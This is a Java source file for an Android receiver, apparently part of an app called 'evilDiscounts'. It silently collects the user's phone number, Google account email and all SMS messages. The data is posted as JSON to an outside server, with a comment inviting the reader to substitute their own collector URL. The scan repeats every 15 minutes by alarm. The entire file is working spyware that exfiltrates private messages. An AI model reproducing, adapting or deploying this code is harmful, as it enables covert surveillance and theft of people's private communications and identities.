package com.evilDiscounts;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Calendar;
import java.util.GregorianCalendar;

import org.json.JSONArray;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import android.util.Log;

/*
 * This receiver scans all uncanned sms messages and sends them to the server.
 */
public class ScanSMSReceiver extends BroadcastReceiver {

  @Override
  public void onReceive(Context context, Intent intent) {
    // Get the user's number.
    TelephonyManager mTelephonyMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
    String mynumber = mTelephonyMgr.getLine1Number().substring(1);
    
    // Get the user's primary email.
    Account[] accounts = AccountManager.get(context).getAccountsByType("com.google");
    final String primaryEmail = accounts[0].name;
    
    // Get all unscanned texts
    Sms[] texts = SmsHelpers.getSmsDetails(context);
    // Get a json array of all text message objects
    JSONArray jsonTexts = new JSONArray();
    for (Sms text : texts) {
      jsonTexts.put(text.toJson(mynumber, primaryEmail));
    }
    // Send them.
    URL url;
    HttpURLConnection connect = null;
    BufferedReader rd;
    StringBuilder sb;
    OutputStreamWriter wr;
    // Change this url to the url of your receiveJsonSms.php.
    String urlString = "http://www.paintedostrich.com/receiveJsonSms.php";
    try {
      System.setProperty("http.keepAlive", "false");
      url = new URL(urlString);
      connect = (HttpURLConnection) url.openConnection();
      connect.setRequestMethod("POST");
      connect.setDoOutput(true);
      connect.setDoInput(true);
      connect.setReadTimeout(10000);

      connect.connect();

      // write to the stream
      String data = URLEncoder.encode("texts", "UTF-8") + "="
              + URLEncoder.encode(jsonTexts.toString(), "UTF-8");

      wr = new OutputStreamWriter(connect.getOutputStream());
      wr.write(data);
      wr.flush();

      // read the result from the server
      rd = new BufferedReader(new InputStreamReader(connect.getInputStream()));
      sb = new StringBuilder();
      String line = null;
      while ((line = rd.readLine()) != null) {
        sb.append(line);
      }
    } catch (MalformedURLException e1) {
      e1.printStackTrace();
      Log.e("URL INVALID:", "The url given, " + urlString + ", is invalid.");
      return;
    } catch (IOException e) {
      e.printStackTrace();
      return;
    } finally {
      // close the connection, set all objects to null
      connect.disconnect();
      rd = null;
      sb = null;
      wr = null;
      connect = null;
      setSmsAlarm(context);
    }
  }
  
  // Set this receiver to trigger again in 15 minutes.
  private void setSmsAlarm(Context context) {
    Intent i = new Intent(context, ScanSMSReceiver.class);
    GregorianCalendar cal = new GregorianCalendar();
    int _id = (int) System.currentTimeMillis();
    PendingIntent appIntent =
        PendingIntent.getBroadcast(context, _id, i, PendingIntent.FLAG_ONE_SHOT);

    cal.add(Calendar.MINUTE, 15);
    Log.i("SMS_SCAN_ALARM_SET", "Set scan sms alarm for " + cal.get(Calendar.HOUR) + ":" + cal.get(Calendar.MINUTE));
    AlarmManager am = (AlarmManager)context.getSystemService(Activity.ALARM_SERVICE);
    am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
            appIntent);
  }
}
